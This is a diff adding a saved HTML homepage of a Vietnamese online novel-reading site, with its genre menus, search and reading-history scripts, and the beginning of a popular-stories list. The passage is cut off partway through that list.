@@ -1,0 +1,2061 @@
+<!DOCTYPE html>
+<!-- saved from url=(0024)https://truyennhieu.com/ -->
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<link rel="stylesheet" type="text/css" href="./truyennhieu_files/fonts.css"><script type="text/javascript" async="" src="./truyennhieu_files/vc.js.tải xuống"></script><script type="text/javascript" async="" src="./truyennhieu_files/analytics.js.tải xuống"></script><script src="./truyennhieu_files/osd.js.tải xuống"></script><script src="./truyennhieu_files/ca-pub-2978388862278998.js.tải xuống"></script><script async="" src="./truyennhieu_files/js(1)"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+
+<title>Đọc truyện online, truyện gì cũng có</title>
+<meta name="title" content="Đọc truyện online, truyện gì cũng có">
+<meta name="description" content="Đọc truyện hay online, đọc sách, ebook hay, đọc truyện chữ, truyện hay và đọc truyện full mọi lúc mọi nơi trên mọi thiết bị và cập nhật hàng ngày.">
+<meta name="keywords" content="doc truyen hay online, doc sach, webtruyen, sach truyen ban quyen, truyen ngon tinh, truyen 18+, sach hay, ebook hay, doc sach online, thu vien sach, thu vien ebook, ebook">
+    
+        <link rel="canonical" href="https://truyennhieu.com/">
+        <link rel="alternate" href="https://truyennhieu.com/" hreflang="vi-vn">
+    
+
+
+<link rel="dns-prefetch" href="https://ajax.googleapis.com/">
+
+
+
+<meta name="author" content="truyennhieu.com">
+<meta name="copyright" content="truyennhieu.com">
+<meta http-equiv="REFRESH" content="1800">
+<!-- <link rel="stylesheet" id="google-fonts-css" href="https://fonts.googleapis.com/css?family=Poppins%3A100%2C100i%2C200%2C200i%2C300%2C300i%2C400%2C400i%2C500%2C500i%2C600%2C600i%2C700%2C700i%2C800%2C800i%2C900%2C900i&amp;ver=4.9.8" type="text/css" media="all"> -->
+<!-- OG/Google Plus -->
+<meta http-equiv="REFRESH" content="1800">
+<meta name="msvalidate.01" content="CE6598A752006D961B46735B05AF9C26">
+
+<link href="./truyennhieu_files/style.css" rel="stylesheet" type="text/css">
+<link rel="icon" type="image/png" sizes="96x96" href="https://truyennhieu.com/images/icons/favicon-96x96.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://truyennhieu.com/images/icons/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://truyennhieu.com/images/icons/favicon-16x16.png">
+<script src="./truyennhieu_files/jquery-3.3.1.min.js.tải xuống" type="text/javascript"></script>
+
+<script>
+    $(document).ready(function() {
+        (function(d) {
+            var wf = d.createElement('link'), s = d.scripts[0];
+            wf.rel = 'stylesheet'
+            wf.type = 'text/css'
+            wf.href = '/css/fonts.css';
+            s.parentNode.insertBefore(wf, s);
+        })(document);
+    });
+</script>
+
+<script type="text/javascript">
+
+    function loadHistory() {
+        let history = JSON.parse(localStorage.getItem('history'));
+        if (!history || !history.length) {
+            return;
+        } 
+
+        $('.book-doctruyen').removeClass('hide');
+        let ul = $('.doctruyen-item ul');
+
+        for (let i = 0; i < history.length; i++) {
+            let bookHistory = history[i];
+            var li =
+                `<li itemscope="" >
+                        <div class="box-book-info">
+                            <h3 class="font-title"><a href="#bookLink" class="name-book ellipsis-1">#bookName</a></h3>
+                            <a href="#chapterLink" class="name-chapter">Đọc tiếp #chapterName</a>
+                        </div>
+                    </li>`;
+
+            li = li.replace('#bookName', bookHistory.name);
+            li = li.replace('#bookLink', bookHistory.link);
+            li = li.replace('#chapterName', bookHistory.chapter.name);
+            li = li.replace('#chapterLink', bookHistory.chapter.link);
+            ul.append(li);
+        }
+    }
+
+	$(document).ready(function(){
+    const observer = lozad();
+    observer.observe();
+
+		$('.hover').hover(
+			function(){
+				$('.myTip').css("width","0").hide();
+				$(this).find('.myTip').show().animate({width:130},"medium");
+			},
+			function(){
+				$('.myTip').css("width","0").hide();
+			}
+		);
+
+        loadHistory();
+	});
+
+
+	$(document).scroll(function () {
+			var y = $(this).scrollTop();
+			if (y > 144) {
+				$('.box-logo-search').addClass("pfix").fadeIn();
+			} else {
+				$('.box-logo-search').removeClass("pfix").fadeIn();
+			}
+	});
+
+	$('#fun_search').mouseover(function () {
+			$("#divSuggestion").addClass("hide").hide('fast');
+		});
+
+		function showsl(){
+			  if (document.getElementById("txtSearch").value!='Nhập tên sách hoặc tác giả'){
+					$("#divSuggestion").removeClass("hide").show('slow')
+				}else{
+					$("#divSuggestion").addClass("hide").show('fast')
+				}
+			}
+		function hidesl(){
+					$("#divSuggestion").addClass("hide").hide('fast')
+					document.getElementById("txtSearch").value='Nhập tên sách hoặc tác giả';
+			}
+
+			$(document).ready(function() {
+	 				// Hover Notify menu
+	 				var divViewHover = $('li.viewed>div.viewHover');
+	 				var liViewHoverItem = divViewHover.children('li');
+	 				var indexViewedLi = 0;
+	 				$('ul.topmenu>li').hover(function() {
+	 					//displaySuggestItem(0);
+	 					liViewHoverItem.removeClass('active');
+	 					$(this).addClass('hover');
+	 					$(this).children('div.submenu-topbar').show();
+	 				}, function() {
+	 					$(this).removeClass('hover');
+	 					$(this).children('div.submenu-topbar').hide();
+	 				});
+	 			});
+
+		 $(document).ready(function() {
+				// Hover Notify menu
+				var divViewHover = $('li.viewed>div.viewHover');
+				var liViewHoverItem = divViewHover.children('li');
+				var indexViewedLi = 0;
+				$('ul.user-funtion>li').hover(function() {
+					//displaySuggestItem(0);
+					liViewHoverItem.removeClass('hover');
+					$(this).addClass('hover');
+					$(this).children('div.submenu-topbar').show();
+				}, function() {
+					$(this).removeClass('hover');
+					$(this).children('div.submenu-topbar').hide();
+				});
+			});
+</script>
+<link rel="preload" href="./truyennhieu_files/f.txt" as="script"><script type="text/javascript" src="./truyennhieu_files/f.txt"></script><link rel="preload" href="./truyennhieu_files/f(1).txt" as="script"><script type="text/javascript" src="./truyennhieu_files/f(1).txt"></script><link rel="preload" href="https://pagead2.googlesyndication.com/pagead/js/r20190708/r20190131/show_ads_impl.js" as="script"><link rel="stylesheet" type="text/css" href="chrome-extension://bomnonlkifccecemokdpehhcjcibgnlm/css/main.css"><style type="text/css">.adsteroid-el {margin: 0 auto;}</style><script async="" type="text/javascript" src="./truyennhieu_files/saved_resource(1)"></script><script async="" type="text/javascript" src="./truyennhieu_files/fingerprint2.min.js.tải xuống"></script><script async="" type="text/javascript" src="./truyennhieu_files/pops"></script><script async="" type="text/javascript" src="./truyennhieu_files/pops(1)"></script><script src="./truyennhieu_files/YpR3pZrsaKkC1CN97t5weiuivVRckdhj.js.tải xuống" async=""></script></head>
+<body>
+
+<div class="header" id="bodyread">
+  <div class="wrap">
+    <div class="container">
+    <a href="https://truyennhieu.com/" class="box-logo" title="Đọc truyện online, truyện gì cũng có"> <img src="./truyennhieu_files/truyennhieu-logo.svg" class="img-svg" title="Đọc truyện online, truyện gì cũng có" alt="Đọc truyện online, truyện gì cũng có"> </a>
+      <div class="navbar-menu">
+        <ul class="left-menu mainmenu">
+          <li class="active"><a href="https://truyennhieu.com/" rel="dofollow" title="Trang chủ"><span class="icon-home"></span></a></li>
+          <li class=""><a href="https://truyennhieu.com/#" rel="dofollow" title="Thể loại">Thể loại</a>
+            <div class="mainmenu-topbar hide" style="display: none;">
+              <div class="main-menu-more">
+                <div class="menu-show-full-cate">
+                  <ul class="list-menu col-3">
+                    <li><a href="https://truyennhieu.com/the-loai/" title="Tất cả truyện">Tất cả</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai//5c552b080883cb449f3ee186" title="Truyện "></a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/tien-hiep/5bdec66306c7c41b7eea0fe4" title="Truyện Tiên Hiệp">Tiên Hiệp</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/kiem-hiep/5be109e6b22428286417369f" title="Truyện Kiếm Hiệp">Kiếm Hiệp</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/ngon-tinh/5bdec27dc551731a60abe1ff" title="Truyện Ngôn Tình">Ngôn Tình</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/do-thi/5bdec27dc551731a60abe201" title="Truyện Đô Thị">Đô Thị</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/quan-truong/5be6a6689d614d46ffa68d92" title="Truyện Quan Trường">Quan Trường</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/vong-du/5bdf022606c7c41b7eea55c0" title="Truyện Võng Du">Võng Du</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/khoa-huyen/5bdf18bc06c7c41b7eea8070" title="Truyện Khoa Huyễn">Khoa Huyễn</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/huyen-huyen/5bdecab406c7c41b7eea20b9" title="Truyện Huyền Huyễn">Huyền Huyễn</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/di-gioi/5bdecab406c7c41b7eea20b6" title="Truyện Dị Giới">Dị Giới</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/di-nang/5be1c56b1b07282cdf88e775" title="Truyện Dị Năng">Dị Năng</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/quan-su/5be67f9e9d614d46ffa63eb4" title="Truyện Quân Sự">Quân Sự</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/lich-su/5be1b09ee2f0522ba9218079" title="Truyện Lịch Sử">Lịch Sử</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/xuyen-khong/5bdecab406c7c41b7eea20b8" title="Truyện Xuyên Không">Xuyên Không</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/trong-sinh/5bdfb00f8ee5f91f329931cc" title="Truyện Trọng Sinh">Trọng Sinh</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/trinh-tham/5be268277f0e2b2fdfe6461c" title="Truyện Trinh Thám">Trinh Thám</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/tham-hiem/5be25add7f0e2b2fdfe62c1b" title="Truyện Thám Hiểm">Thám Hiểm</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/linh-di/5be2af29ea81db31673b318f" title="Truyện Linh Dị">Linh Dị</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/sac/5be10a0ab2242828641736e8" title="Truyện Sắc">Sắc</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/nguoc/5be1bbf9e2f0522ba92180d5" title="Truyện Ngược">Ngược</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/sung/5bdec66306c7c41b7eea0fe8" title="Truyện Sủng">Sủng</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/cung-dau/5be3b84d6e8d9936a27d6602" title="Truyện Cung Đấu">Cung Đấu</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/nu-cuong/5be1be3ce2f0522ba9218544" title="Truyện Nữ Cường">Nữ Cường</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/gia-dau/5be2639f7f0e2b2fdfe63d31" title="Truyện Gia Đấu">Gia Đấu</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/dong-phuong/5be679bc9d614d46ffa62b08" title="Truyện Đông Phương">Đông Phương</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/dam-my/5bdf162c06c7c41b7eea7b78" title="Truyện Đam Mỹ">Đam Mỹ</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/bach-hop/5be7208e5ce85f4bc1f4ca89" title="Truyện Bách Hợp">Bách Hợp</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/hai-huoc/5bdec66306c7c41b7eea0fe6" title="Truyện Hài Hước">Hài Hước</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/dien-van/5be266f47f0e2b2fdfe643b9" title="Truyện Điền Văn">Điền Văn</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/co-dai/5be10a3ab224282864173745" title="Truyện Cổ Đại">Cổ Đại</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/mat-the/5be267aa7f0e2b2fdfe64523" title="Truyện Mạt Thế">Mạt Thế</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/truyen-teen/5bdefffe06c7c41b7eea519b" title="Truyện Truyện Teen">Truyện Teen</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/phuong-tay/5be1d1492b9b392d52d2ff68" title="Truyện Phương Tây">Phương Tây</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/nu-phu/5be681599d614d46ffa64213" title="Truyện Nữ Phụ">Nữ Phụ</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/light-novel/5be7bd9e5ce85f4bc1f513c7" title="Truyện Light Novel">Light Novel</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/viet-nam/5be1b09ee2f0522ba9218078" title="Truyện Việt Nam">Việt Nam</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/doan-van/5be686be9d614d46ffa64cae" title="Truyện Đoản Văn">Đoản Văn</a></li>
+                    
+                      <li><a href="https://truyennhieu.com/the-loai/khac/5be68b279d614d46ffa65726" title="Truyện Khác">Khác</a></li>
+                    
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </li>
+          
+            
+                <li class=""><a href="https://truyennhieu.com/the-loai/kiem-hiep/5be109e6b22428286417369f" rel="dofollow" title="Kiếm Hiệp">Kiếm Hiệp</a></li>
+            
+                <li class=""><a href="https://truyennhieu.com/the-loai/ngon-tinh/5bdec27dc551731a60abe1ff" rel="dofollow" title="Ngôn Tình">Ngôn Tình</a></li>
+            
+          
+        </ul>
+      </div>
+       <a hidden="#" onclick="showSearchBar()" class="btn-search-icon"></a>
+      <div class="fun_search" id="fun_search">
+        <div class="box-input">
+          <input id="txtSearch" type="text" class="i-search" value="Nhập tên sách hoặc tác giả" onkeypress="return keywordPressed(event)" onfocus="if (this.value == &#39;Nhập tên sách hoặc tác giả&#39;) {this.value = &#39;&#39;; }">
+          </div>
+          <a class="b-search" onclick="submitSearch()" title="Tìm kiếm"></a>
+          <a onclick="hideSearchBar()" class="btn-txt-cancel-search" title="Hủy search" rel="nofollow">Hủy</a>
+      </div>
+    </div>
+  </div>
+</div>
+<script type="text/javascript">
+  $(document).ready(function() {
+   // Hover Notify menu
+   var divViewHover = $('li.viewed>div.viewHover');
+   var liViewHoverItem = divViewHover.children('li');
+   var indexViewedLi = 0;
+   $('ul.mainmenu>li').hover(function() {
+     //displaySuggestItem(0);
+     liViewHoverItem.removeClass('hover');
+     $(this).addClass('hover');
+     $(this).children('div.mainmenu-topbar').show();
+   }, function() {
+     $(this).removeClass('hover');
+     $(this).children('div.mainmenu-topbar').hide();
+   });
+ });
+
+  function submitSearch() {
+    let keyword = $('#txtSearch').val()
+    if (!keyword) {
+      return
+    }
+
+    window.location = ('/tim-kiem?q=' + encodeURI(keyword))
+  }
+
+  function keywordPressed(event) {
+    if (event.keyCode == 13) {
+        submitSearch()
+        return false;
+    }
+
+    return true
+  }
+
+  function hideSearchBar() {
+    $('#fun_search').attr('style', '')
+    $('.btn-search-icon').attr('style', '')
+  }
+
+  function showSearchBar() {
+    $('.btn-search-icon').css('display', 'none')
+    $('#fun_search').css('display', 'unset')
+  }
+</script>
+
+
+<div class="navbar-breadcrumb">
+  <div class="wrap">
+    <div class="container"><span class="title-trending">Đọc truyện online, đọc truyện chữ, truyện full, truyện hay. Tổng hợp truyện gì cũng có và cập nhật liên tục.</span> </div>
+  </div>
+</div>
+<div class="box-top-novel">
+  <div class="wrap">
+    <div class="container">
+      <div class="tile-main-title">
+        <div class="box-icon"> <i class="truyenn-icon_hot"></i> </div>
+        <div class="box-txt-show">
+          <h2>Truyện hot</h2>
+        </div>
+        <div class="right-slect-field">
+          <div class="custom-select-wrapper">
+						<div class="custom-select-wrapper"><select name="sources" id="hotSources" class="custom-select sources" placeholder="Tất cả" aria-label="Chọn thể loại" style="display: none;">
+							<option value="">Tất cả</option>
+							
+								<option value="5c552b080883cb449f3ee186"></option>
+							
+								<option value="5bdec66306c7c41b7eea0fe4">Tiên Hiệp</option>
+							
+								<option value="5be109e6b22428286417369f">Kiếm Hiệp</option>
+							
+								<option value="5bdec27dc551731a60abe1ff">Ngôn Tình</option>
+							
+								<option value="5bdec27dc551731a60abe201">Đô Thị</option>
+							
+								<option value="5be6a6689d614d46ffa68d92">Quan Trường</option>
+							
+								<option value="5bdf022606c7c41b7eea55c0">Võng Du</option>
+							
+								<option value="5bdf18bc06c7c41b7eea8070">Khoa Huyễn</option>
+							
+								<option value="5bdecab406c7c41b7eea20b9">Huyền Huyễn</option>
+							
+								<option value="5bdecab406c7c41b7eea20b6">Dị Giới</option>
+							
+								<option value="5be1c56b1b07282cdf88e775">Dị Năng</option>
+							
+								<option value="5be67f9e9d614d46ffa63eb4">Quân Sự</option>
+							
+								<option value="5be1b09ee2f0522ba9218079">Lịch Sử</option>
+							
+								<option value="5bdecab406c7c41b7eea20b8">Xuyên Không</option>
+							
+								<option value="5bdfb00f8ee5f91f329931cc">Trọng Sinh</option>
+							
+								<option value="5be268277f0e2b2fdfe6461c">Trinh Thám</option>
+							
+								<option value="5be25add7f0e2b2fdfe62c1b">Thám Hiểm</option>
+							
+								<option value="5be2af29ea81db31673b318f">Linh Dị</option>
+							
+								<option value="5be10a0ab2242828641736e8">Sắc</option>
+							
+								<option value="5be1bbf9e2f0522ba92180d5">Ngược</option>
+							
+								<option value="5bdec66306c7c41b7eea0fe8">Sủng</option>
+							
+								<option value="5be3b84d6e8d9936a27d6602">Cung Đấu</option>
+							
+								<option value="5be1be3ce2f0522ba9218544">Nữ Cường</option>
+							
+								<option value="5be2639f7f0e2b2fdfe63d31">Gia Đấu</option>
+							
+								<option value="5be679bc9d614d46ffa62b08">Đông Phương</option>
+							
+								<option value="5bdf162c06c7c41b7eea7b78">Đam Mỹ</option>
+							
+								<option value="5be7208e5ce85f4bc1f4ca89">Bách Hợp</option>
+							
+								<option value="5bdec66306c7c41b7eea0fe6">Hài Hước</option>
+							
+								<option value="5be266f47f0e2b2fdfe643b9">Điền Văn</option>
+							
+								<option value="5be10a3ab224282864173745">Cổ Đại</option>
+							
+								<option value="5be267aa7f0e2b2fdfe64523">Mạt Thế</option>
+							
+								<option value="5bdefffe06c7c41b7eea519b">Truyện Teen</option>
+							
+								<option value="5be1d1492b9b392d52d2ff68">Phương Tây</option>
+							
+								<option value="5be681599d614d46ffa64213">Nữ Phụ</option>
+							
+								<option value="5be7bd9e5ce85f4bc1f513c7">Light Novel</option>
+							
+								<option value="5be1b09ee2f0522ba9218078">Việt Nam</option>
+							
+								<option value="5be686be9d614d46ffa64cae">Đoản Văn</option>
+							
+								<option value="5be68b279d614d46ffa65726">Khác</option>
+							
+          	</select><div class="custom-select sources"><span class="custom-select-trigger">Tất cả</span><div class="custom-options"><span class="custom-option undefined" data-value="">Tất cả</span><span class="custom-option undefined" data-value="5c552b080883cb449f3ee186"></span><span class="custom-option undefined" data-value="5bdec66306c7c41b7eea0fe4">Tiên Hiệp</span><span class="custom-option undefined" data-value="5be109e6b22428286417369f">Kiếm Hiệp</span><span class="custom-option undefined" data-value="5bdec27dc551731a60abe1ff">Ngôn Tình</span><span class="custom-option undefined" data-value="5bdec27dc551731a60abe201">Đô Thị</span><span class="custom-option undefined" data-value="5be6a6689d614d46ffa68d92">Quan Trường</span><span class="custom-option undefined" data-value="5bdf022606c7c41b7eea55c0">Võng Du</span><span class="custom-option undefined" data-value="5bdf18bc06c7c41b7eea8070">Khoa Huyễn</span><span class="custom-option undefined" data-value="5bdecab406c7c41b7eea20b9">Huyền Huyễn</span><span class="custom-option undefined" data-value="5bdecab406c7c41b7eea20b6">Dị Giới</span><span class="custom-option undefined" data-value="5be1c56b1b07282cdf88e775">Dị Năng</span><span class="custom-option undefined" data-value="5be67f9e9d614d46ffa63eb4">Quân Sự</span><span class="custom-option undefined" data-value="5be1b09ee2f0522ba9218079">Lịch Sử</span><span class="custom-option undefined" data-value="5bdecab406c7c41b7eea20b8">Xuyên Không</span><span class="custom-option undefined" data-value="5bdfb00f8ee5f91f329931cc">Trọng Sinh</span><span class="custom-option undefined" data-value="5be268277f0e2b2fdfe6461c">Trinh Thám</span><span class="custom-option undefined" data-value="5be25add7f0e2b2fdfe62c1b">Thám Hiểm</span><span class="custom-option undefined" data-value="5be2af29ea81db31673b318f">Linh Dị</span><span class="custom-option undefined" data-value="5be10a0ab2242828641736e8">Sắc</span><span class="custom-option undefined" data-value="5be1bbf9e2f0522ba92180d5">Ngược</span><span class="custom-option undefined" data-value="5bdec66306c7c41b7eea0fe8">Sủng</span><span class="custom-option undefined" data-value="5be3b84d6e8d9936a27d6602">Cung Đấu</span><span class="custom-option undefined" data-value="5be1be3ce2f0522ba9218544">Nữ Cường</span><span class="custom-option undefined" data-value="5be2639f7f0e2b2fdfe63d31">Gia Đấu</span><span class="custom-option undefined" data-value="5be679bc9d614d46ffa62b08">Đông Phương</span><span class="custom-option undefined" data-value="5bdf162c06c7c41b7eea7b78">Đam Mỹ</span><span class="custom-option undefined" data-value="5be7208e5ce85f4bc1f4ca89">Bách Hợp</span><span class="custom-option undefined" data-value="5bdec66306c7c41b7eea0fe6">Hài Hước</span><span class="custom-option undefined" data-value="5be266f47f0e2b2fdfe643b9">Điền Văn</span><span class="custom-option undefined" data-value="5be10a3ab224282864173745">Cổ Đại</span><span class="custom-option undefined" data-value="5be267aa7f0e2b2fdfe64523">Mạt Thế</span><span class="custom-option undefined" data-value="5bdefffe06c7c41b7eea519b">Truyện Teen</span><span class="custom-option undefined" data-value="5be1d1492b9b392d52d2ff68">Phương Tây</span><span class="custom-option undefined" data-value="5be681599d614d46ffa64213">Nữ Phụ</span><span class="custom-option undefined" data-value="5be7bd9e5ce85f4bc1f513c7">Light Novel</span><span class="custom-option undefined" data-value="5be1b09ee2f0522ba9218078">Việt Nam</span><span class="custom-option undefined" data-value="5be686be9d614d46ffa64cae">Đoản Văn</span><span class="custom-option undefined" data-value="5be68b279d614d46ffa65726">Khác</span></div></div></div>
+					</div>
+        </div>
+      </div>
+      <div class="box-top-intro">
+				
+  <ul>
+
+    <li class="onetop">
+      <a href="https://truyennhieu.com/choc-tuc-vo-yeu-mua-mot-tang-mot" class="img-left" title="Chọc Tức Vợ Yêu - Mua Một Tặng Một - Quẫn Quẫn Hữu Yêu" itemprop="url">
+        <div class="box-absolute fn-shadow">
+          <div class="img"><img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1544710759/truyen/choc-tuc-vo-yeu-mua-mot-tang-mot.jpg" title="Chọc Tức Vợ Yêu - Mua Một Tặng Một - Quẫn Quẫn Hữu Yêu" alt="Choc Tuc Vo Yeu Mua Mot Tang Mot - Quan Quan Huu Yeu" src="./truyennhieu_files/choc-tuc-vo-yeu-mua-mot-tang-mot.jpg" data-loaded="true"></div>
+        </div>
+      </a>
+      <div class="box-book-info">
+        <h3 class="font-title" itemprop="name">
+          <a href="https://truyennhieu.com/choc-tuc-vo-yeu-mua-mot-tang-mot" class="name-book" title="Tìm các tác phẩm, truyện thơ do tác giả Quẫn Quẫn Hữu Yêu sáng tác">Chọc Tức Vợ Yêu - Mua Một Tặng Một</a>
+        </h3>
+        <h4 class="show-author">
+          <a href="https://truyennhieu.com/tac-gia/quan-quan-huu-yeu/5bdec66306c7c41b7eea0fe7" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Quẫn Quẫn Hữu Yêu sáng tác">Quẫn Quẫn Hữu Yêu</a>
+        </h4>
+      </div>
+    </li>
+    <div class="list-scroll-mobile">
+      <div class="full-scr">
+        
+            
+            <li>
+              <a href="https://truyennhieu.com/linh-vu-thien-ha" class="img-left" title="Linh Vũ Thiên Hạ - Vũ Phong">
+              <div class="box-absolute fn-shadow">
+                <div class="img">
+                  <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1544724771/truyen/linh-vu-thien-ha.jpg" title="Linh Vũ Thiên Hạ - Vũ Phong" alt="Linh Vu Thien Ha - Vu Phong" src="./truyennhieu_files/linh-vu-thien-ha.jpg" data-loaded="true">
+                </div>
+              </div>
+              </a>
+              <div class="box-book-info">
+                <h3 class="font-title" itemprop="name">
+                  <a href="https://truyennhieu.com/linh-vu-thien-ha" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Vũ Phong sáng tác">
+                    Linh Vũ Thiên Hạ</a>
+                </h3>
+                <h4 class="show-author">
+                  <a href="https://truyennhieu.com/tac-gia/vu-phong/5bdecab406c7c41b7eea20b7" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Vũ Phong sáng tác">Vũ Phong</a>
+                </h4>
+              </div>
+            </li>
+        
+            
+            <li>
+              <a href="https://truyennhieu.com/than-dao-dan-ton" class="img-left" title="Thần Đạo Đan Tôn - Cô Đơn Địa Phi">
+              <div class="box-absolute fn-shadow">
+                <div class="img">
+                  <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1544573020/truyen/than-dao-dan-ton.jpg" title="Thần Đạo Đan Tôn - Cô Đơn Địa Phi" alt="Than Dao Dan Ton - Co Don Dia Phi" src="./truyennhieu_files/than-dao-dan-ton.jpg" data-loaded="true">
+                </div>
+              </div>
+              </a>
+              <div class="box-book-info">
+                <h3 class="font-title" itemprop="name">
+                  <a href="https://truyennhieu.com/than-dao-dan-ton" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Cô Đơn Địa Phi sáng tác">
+                    Thần Đạo Đan Tôn</a>
+                </h3>
+                <h4 class="show-author">
+                  <a href="https://truyennhieu.com/tac-gia/co-don-dia-phi/5bded41506c7c41b7eea36ec" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Cô Đơn Địa Phi sáng tác">Cô Đơn Địa Phi</a>
+                </h4>
+              </div>
+            </li>
+        
+            
+            <li>
+              <a href="https://truyennhieu.com/boss-hung-du-ong-xa-ket-hon-di" class="img-left" title="Boss Hung Dữ - Ông Xã Kết Hôn Đi - Thập Nguyệt Sơ">
+              <div class="box-absolute fn-shadow">
+                <div class="img">
+                  <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1544573019/truyen/boss-hung-du-ong-xa-ket-hon-di.jpg" title="Boss Hung Dữ - Ông Xã Kết Hôn Đi - Thập Nguyệt Sơ" alt="Boss Hung Du Ong Xa Ket Hon Di - Thap Nguyet So" src="./truyennhieu_files/boss-hung-du-ong-xa-ket-hon-di.jpg" data-loaded="true">
+                </div>
+              </div>
+              </a>
+              <div class="box-book-info">
+                <h3 class="font-title" itemprop="name">
+                  <a href="https://truyennhieu.com/boss-hung-du-ong-xa-ket-hon-di" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Thập Nguyệt Sơ sáng tác">
+                    Boss Hung Dữ - Ông Xã Kết Hôn Đi</a>
+                </h3>
+                <h4 class="show-author">
+                  <a href="https://truyennhieu.com/tac-gia/thap-nguyet-so/5bdedd8d06c7c41b7eea4972" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Thập Nguyệt Sơ sáng tác">Thập Nguyệt Sơ</a>
+                </h4>
+              </div>
+            </li>
+        
+            
+            <li>
+              <a href="https://truyennhieu.com/vo-thuong-sat-than" class="img-left" title="Vô Thượng Sát Thần - Tà Tâm Vị Mẫn">
+              <div class="box-absolute fn-shadow">
+                <div class="img">
+                  <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1544573020/truyen/vo-thuong-sat-than.jpg" title="Vô Thượng Sát Thần - Tà Tâm Vị Mẫn" alt="Vo Thuong Sat Than - Ta Tam Vi Man" src="./truyennhieu_files/vo-thuong-sat-than.jpg" data-loaded="true">
+                </div>
+              </div>
+              </a>
+              <div class="box-book-info">
+                <h3 class="font-title" itemprop="name">
+                  <a href="https://truyennhieu.com/vo-thuong-sat-than" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Tà Tâm Vị Mẫn sáng tác">
+                    Vô Thượng Sát Thần</a>
+                </h3>
+                <h4 class="show-author">
+                  <a href="https://truyennhieu.com/tac-gia/ta-tam-vi-man/5bdfb00f8ee5f91f329931cd" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Tà Tâm Vị Mẫn sáng tác">Tà Tâm Vị Mẫn</a>
+                </h4>
+              </div>
+            </li>
+        
+            
+            <li>
+              <a href="https://truyennhieu.com/dau-pha-thuong-khung" class="img-left" title="Đấu Phá Thương Khung - Thiên Tàm Thổ Đậu">
+              <div class="box-absolute fn-shadow">
+                <div class="img">
+                  <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1544573020/truyen/dau-pha-thuong-khung.jpg" title="Đấu Phá Thương Khung - Thiên Tàm Thổ Đậu" alt="Dau Pha Thuong Khung - Thien Tam Tho Dau" src="./truyennhieu_files/dau-pha-thuong-khung.jpg" data-loaded="true">
+                </div>
+              </div>
+              </a>
+              <div class="box-book-info">
+                <h3 class="font-title" itemprop="name">
+                  <a href="https://truyennhieu.com/dau-pha-thuong-khung" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Thiên Tàm Thổ Đậu sáng tác">
+                    Đấu Phá Thương Khung</a>
+                </h3>
+                <h4 class="show-author">
+                  <a href="https://truyennhieu.com/tac-gia/thien-tam-tho-dau/5bdfb4108ee5f91f32994108" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Thiên Tàm Thổ Đậu sáng tác">Thiên Tàm Thổ Đậu</a>
